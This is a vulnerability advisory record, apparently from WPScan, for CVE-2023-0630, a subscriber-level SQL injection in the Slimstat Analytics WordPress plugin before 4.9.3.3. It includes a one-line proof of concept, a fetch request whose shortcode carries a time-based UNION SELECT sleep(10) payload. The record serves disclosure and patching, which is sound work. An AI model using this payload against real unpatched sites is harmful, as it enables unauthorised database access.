title = "Slimstat Analytics < 4.9.3.3 – Subscriber+ SQL Injection | CVE 2023-0630 | Plugin Vulnerabilities"
description = """
Description
\t\t\tThe plugin does not prevent subscribers from rendering shortcodes that concatenates attributes directly into an SQL query."""
full_description = '''WordPress Plugin Vulnerabilities Slimstat Analytics < 4.9.3.3 - Subscriber+ SQL Injection Description The plugin does not prevent subscribers from rendering shortcodes that concatenates attributes directly into an SQL query. Proof of Concept While logged in as a subscriber, send the following request: (await fetch('/wp-admin/admin-ajax.php',{method:'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},body:'action=parse-media-shortcode&shortcode=[slimstat f="count" w="author"]WHERE:1 UNION SELECT sleep(10)-- a[/slimstat]'})).text() If successful, the request should hang for ~10 seconds, indicating we successfully injected something in the affected SQL query. Affects Plugins wp-slimstat Fixed in 4.9.3.3 References CVE CVE-2023-0630 Classification Type SQLI OWASP top 10 A1: Injection CWE CWE-89 CVSS 7.7 (high) Miscellaneous Original Researcher Marc Montpas Submitter Marc Montpas Submitter website https://wpscan.com Submitter twitter marcS0H Verified Yes WPVDB ID b82bdd02-b699-4527-86cc-d60b56ab0c55 Timeline Publicly Published 2023-02-27 (about 1 year ago) Added 2023-02-27 (about 1 year ago) Last Updated 2023-02-27 (about 1 year ago) Other Published Title Published 2014-08-01 Title Zenphoto 1.4.5.2 - wordpress_import.php wp_prefix Function SQL Injection Published 2014-08-01 Title Mingle Forum 1.0.33.3 - wpf.class.php Multiple Parameter SQL Injection Published 2024-10-15 Title Surfer < 1.6.0.523 - Authenticated (Administrator+) SQL Injection Published 2024-09-19 Title TI WooCommerce Wishlist < 2.9.1 - Unauthenticated SQL Injection via lang parameters Published 2021-07-23 Title Embed Youtube Video <= 1.0 - Authenticated SQL Injection'''
